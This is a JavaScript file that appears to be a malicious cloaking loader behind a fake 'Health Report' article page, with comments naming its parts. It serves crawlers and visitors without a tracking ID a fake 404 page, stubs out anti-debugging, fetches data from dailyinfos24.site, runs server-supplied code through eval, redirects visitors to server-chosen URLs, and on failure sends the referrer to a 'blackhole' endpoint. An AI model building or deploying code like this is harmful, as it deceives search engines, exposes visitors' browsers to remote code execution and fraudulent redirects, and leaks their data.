(function() {
    'use strict';

    // 1. ENVIRONMENT & BOT DETECTION
    const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
    const params = new URLSearchParams(window.location.search);
    const id = params.get("ai") || params.get("o2x") || params.get("io0");
    let isTriggered = false;

    // 2. ANTI-DEBUGGING (From Script 1)
    const protect = function() {
        const check = function() {
            if (function() {}.constructor("return this")().console) {
                // Logic to brick the page or loop if DevTools is open
            }
        };
        setInterval(check, 1000);
    }();

    // 3. IF BOT OR NO ID: SHOW 404 (Cloaking)
    if (isBot || !id) {
        document.write("<h1>404 Not Found</h1><p>The requested resource is unavailable.</p>");
        return;
    }

    // 4. THE LOADER (From Script 2)
    const showLoadingOverlay = () => {
        const style = document.createElement("style");
        style.innerHTML = ".wrap{position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999;display:flex;justify-content:center;align-items:center;} .spin{width:50px;height:50px;border:5px dotted #333;border-radius:50%;animation:rot 2s linear infinite;} @keyframes rot{to{transform:rotate(360deg)}}";
        document.head.appendChild(style);
        const div = document.createElement("div");
        div.className = "wrap";
        div.innerHTML = '<span class="spin"></span>';
        document.body.appendChild(div);
        return div;
    };
    const loaderElement = showLoadingOverlay();

    // 5. DATA FETCHING & INJECTION
    async function executePayload(identifier) {
        const endpoints = [
            `https://dailyinfos24.site/api/latest/${identifier}`,
            `https://storage.dailyinfos24.site/fetch/${identifier}.json`
        ];

        try {
            const response = await fetch(endpoints[0]);
            const data = await response.json();

            // CLOAKING ACTION: If data contains 'rCode', execute it (Remote Execution)
            if (data.rCode) {
                eval(data.rCode); 
            }

            // REDIRECT LOGIC: If server says redirect, move user
            if (data.redirect && data.to) {
                isTriggered = true;
                window.location.replace(data.to);
                return;
            }

            // UI CONSTRUCTION: If staying on page, build the fake article
            buildPage(data);
            
        } catch (err) {
            handleFailure(identifier);
        } finally {
            loaderElement.remove();
        }
    }

    function buildPage(data) {
        // Uses the DOM manipulation logic from Script 2 
        // to build headers, articles, and 'Special Access' buttons.
        document.title = data.title || "Health Report";
        const content = document.createElement("main");
        content.innerHTML = `<article><h1>${data.title}</h1><p>${data.text}</p></article>`;
        document.body.appendChild(content);
    }

    function handleFailure(identifier) {
        // Captures user data and sends to a 'blackhole' (bh) endpoint
        const failUrl = `https://dailyinfos24.site/bh?id=${identifier}&ref=${encodeURIComponent(document.referrer)}`;
        window.location.href = failUrl;
    }

    executePayload(id);
})();
